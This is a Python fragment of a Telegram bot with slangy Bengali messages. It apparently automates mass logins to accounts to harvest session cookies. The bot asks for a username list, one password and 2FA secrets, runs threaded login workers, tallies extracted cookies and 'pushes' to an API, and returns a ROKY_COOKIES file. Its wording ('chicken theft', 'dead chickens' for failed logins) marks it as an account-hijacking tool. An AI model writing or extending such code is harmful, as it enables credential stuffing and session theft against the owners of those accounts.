@bot.message_handler(func=lambda m: m.text == "মুরগী চুরি 🍗")
def get_usernames(message):
    user_data_storage[message.chat.id] = {'usernames': [], 'password': '', 'keys': [], 'results': [], 'cookie_count': 0, 'push_ok': 0, 'push_fail': 0, 'login_fail': 0}
    msg = bot.send_message(message.chat.id, "👤 **ইউজারনেম গুলা এক এক কইরা দেও মামা (প্রতি লাইনে একটা):**")
    bot.register_next_step_handler(msg, process_usernames)

def process_usernames(message):
    if message.text.startswith('/'): return
    user_data_storage[message.chat.id]['usernames'] = [u.strip() for u in message.text.split('\n') if u.strip()]
    msg = bot.send_message(message.chat.id, f"🔑 **ওকে মামা!**\nএখন এই {len(user_data_storage[message.chat.id]['usernames'])}টা আইডির পাসওয়ার্ডটা ছাড়ো:")
    bot.register_next_step_handler(msg, process_password)

def process_password(message):
    if message.text.startswith('/'): return
    user_data_storage[message.chat.id]['password'] = message.text.strip()
    msg = bot.send_message(message.chat.id, "🔐 **২এফএ সিক্রেট (2FA key) থাকলে দিয়া দাও:**")
    bot.register_next_step_handler(msg, process_keys)

def process_keys(message):
    if message.text.startswith('/'): return
    text = message.text.strip()
    user_data_storage[message.chat.id]['keys'] = [] if text.upper() == "NO" else [k.strip() for k in text.split('\n') if k.strip()]
    bot.send_message(message.chat.id, "🚀 **ইঞ্জিন ফুল গরম মামা!**\nকাম শুরু হইলো, বইসা বইসা বিড়ি খাও আর দেখো।")
    threading.Thread(target=run_automation, args=(message.chat.id,), daemon=True).start()

def run_automation(chat_id):
    data = user_data_storage[chat_id]
    with ThreadPoolExecutor(max_workers=5) as executor:
        for i, u in enumerate(data['usernames']):
            if chat_id not in user_data_storage: break
            k = data['keys'][i] if i < len(data['keys']) else ""
            executor.submit(login_worker, chat_id, u, data['password'], k)
            time.sleep(2.5)
    time.sleep(5)
    finalize(chat_id)

def finalize(chat_id):
    data = user_data_storage.get(chat_id)
    if not data: return
    summary = f"📊 **কাজের হিসাবপাতি (ROKY)**\n\n🍪 মোট কুকি বের হইছে: {data['cookie_count']} টা\n✅ এপিআই-তে সফল পুশ: {data['push_ok']} টা\n⚠️ পুশ ফেল (এরর): {data['push_fail']} টা\n❌ মরা মুরগী: {data['login_fail']} টা\n\n🔥 **কোপানো শেষ মামা!**"
    if data['results']:
        f_path = f"ROKY_COOKIES_{chat_id}.txt"
        with open(f_path, "w", encoding="utf-8") as f: f.write("\n".join(data['results']))
        with open(f_path, "rb") as d: bot.send_document(chat_id, d, caption=summary, parse_mode="Markdown")
        os.remove(f_path)
    else: bot.send_message(chat_id, summary, parse_mode="Markdown")
    user_data_storage.pop(chat_id, None)

